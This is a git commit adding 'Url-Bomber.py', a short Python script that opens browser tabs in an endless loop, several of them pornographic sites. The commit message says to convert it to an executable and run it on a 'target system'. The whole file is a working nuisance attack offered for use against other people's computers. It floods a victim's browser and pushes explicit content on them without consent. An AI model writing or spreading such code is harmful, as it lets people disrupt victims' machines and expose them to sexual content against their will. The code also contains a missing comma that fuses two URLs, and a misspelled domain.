4f3325988d5afa89761326ead0a38e075783b01e
zmkingufo <134594867+zmkingufo@users.noreply.github.com>
2023-05-29 01:53:57 -0700

    Add files via upload
    Change It To Exe And Run It To Target System And Then Url Will Open In Chrome

---
+++ Url-Bomber.py
@@ -0,0 +1,18 @@
+import webbrowser
+
+
+
+urls = {"www.pornhub.com",
+        "www.xnxx.com",
+        "www.xvideo.com",
+        "www.shad.ir",
+        "www.rubika.ir"
+        "www.youtube.com",
+        "www.instagram.com",
+        "www.googel.com",
+        "www.github.com",
+        "www.python.org"}
+
+while True:
+    for i in urls:
+        webbrowser.open_new_tab(i)
